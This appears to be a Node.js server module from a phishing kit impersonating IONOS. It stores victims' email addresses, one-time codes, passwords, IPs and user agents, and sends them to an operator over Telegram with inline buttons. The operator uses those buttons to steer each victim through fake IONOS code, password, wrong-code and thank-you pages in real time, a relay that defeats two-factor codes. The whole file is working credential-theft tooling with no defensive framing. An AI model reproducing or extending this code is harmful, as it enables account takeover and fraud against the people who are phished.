const crypto = require("crypto");

const sessions = new Map();
const SESSION_TTL_MS = 2 * 60 * 60 * 1000;

const REDIRECTS = {
  code: (id) => `/ionos-emailconfirmation.html?s=${id}`,
  password: (id) => `/ionos-password.html?s=${id}`,
  thankyou: () => `/ionos-thankyou.html`,
  waiting: (id) => `/ionos-waiting.html?s=${id}`,
};

const CODE_ERROR =
  "Der eingegebene Code ist ungültig. Bitte versuchen Sie es erneut.";

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function pruneSessions() {
  const now = Date.now();
  for (const [id, session] of sessions) {
    if (now - session.updatedAt > SESSION_TTL_MS) {
      sessions.delete(id);
    }
  }
}

function createSession({ email, ip, ua }) {
  pruneSessions();
  const id = crypto.randomBytes(8).toString("hex");
  const session = {
    id,
    email,
    code: "",
    password: "",
    step: "email_submitted",
    pending: "email",
    redirect: null,
    error: null,
    ip: ip || "unknown",
    ua: ua || "",
    createdAt: Date.now(),
    updatedAt: Date.now(),
  };
  sessions.set(id, session);
  return session;
}

function getSession(id) {
  pruneSessions();
  return sessions.get(id) || null;
}

function updateSession(id, patch) {
  const session = getSession(id);
  if (!session) return null;
  Object.assign(session, patch, { updatedAt: Date.now() });
  return session;
}

function listSessions() {
  pruneSessions();
  return Array.from(sessions.values()).sort((a, b) => b.updatedAt - a.updatedAt);
}

function applyAdminAction(id, action) {
  const session = getSession(id);
  if (!session) return { ok: false, error: "session_not_found" };

  switch (action) {
    case "code":
      updateSession(id, {
        pending: null,
        redirect: REDIRECTS.code(id),
        error: null,
      });
      break;
    case "password":
      updateSession(id, {
        pending: null,
        redirect: REDIRECTS.password(id),
        error: null,
      });
      break;
    case "code_bad":
      updateSession(id, {
        pending: null,
        redirect: REDIRECTS.code(id),
        error: CODE_ERROR,
      });
      break;
    case "thankyou":
      updateSession(id, {
        pending: null,
        redirect: REDIRECTS.thankyou(),
        error: null,
        step: "done",
      });
      break;
    default:
      return { ok: false, error: "unknown_action" };
  }

  return { ok: true, session: getSession(id) };
}

function getPollState(id) {
  const session = getSession(id);
  if (!session) {
    return { ok: false, status: "gone" };
  }

  if (session.redirect) {
    const redirect = session.redirect;
    const error = session.error;
    session.redirect = null;
    if (!error) session.error = null;
    session.updatedAt = Date.now();
    return {
      ok: true,
      status: error ? "error" : "redirect",
      redirect,
      error,
      email: session.email,
    };
  }

  return {
    ok: true,
    status: "waiting",
    pending: session.pending,
    email: session.email,
    step: session.step,
  };
}

function buildTelegramKeyboard(session) {
  const p = `i:${session.id}:`;
  if (session.pending === "email") {
    return {
      inline_keyboard: [
        [
          { text: "📧 E-Mail Code", callback_data: p + "code" },
          { text: "🔑 Passwort", callback_data: p + "password" },
        ],
      ],
    };
  }
  if (session.pending === "code") {
    return {
      inline_keyboard: [
        [
          { text: "✅ Code OK → Passwort", callback_data: p + "password" },
          { text: "❌ Falscher Code", callback_data: p + "code_bad" },
        ],
        [{ text: "🎉 Thank You", callback_data: p + "thankyou" }],
      ],
    };
  }
  if (session.pending === "password") {
    return {
      inline_keyboard: [[{ text: "🎉 Thank You", callback_data: p + "thankyou" }]],
    };
  }
  return null;
}

function formatSessionMessage(session, title) {
  const lines = [
    `<b>${title}</b>`,
    "",
    `<b>Session:</b> <code>${escapeHtml(session.id)}</code>`,
    `<b>Email:</b> ${escapeHtml(session.email)}`,
    `<b>IP:</b> ${escapeHtml(session.ip)}`,
  ];
  if (session.code) lines.push(`<b>Code:</b> <code>${escapeHtml(session.code)}</code>`);
  if (session.password) lines.push(`<b>Passwort:</b> <code>${escapeHtml(session.password)}</code>`);
  lines.push(`<b>Schritt:</b> ${escapeHtml(session.step)}`);
  lines.push("", "Wähle wohin der User weitergeleitet wird:");
  return lines.join("\n");
}

function parseCallbackData(data) {
  if (!data || !data.startsWith("i:")) return null;
  const parts = data.split(":");
  if (parts.length !== 3) return null;
  return { id: parts[1], action: parts[2] };
}

module.exports = {
  CODE_ERROR,
  REDIRECTS,
  applyAdminAction,
  buildTelegramKeyboard,
  createSession,
  escapeHtml,
  formatSessionMessage,
  getPollState,
  getSession,
  listSessions,
  parseCallbackData,
  updateSession,
};
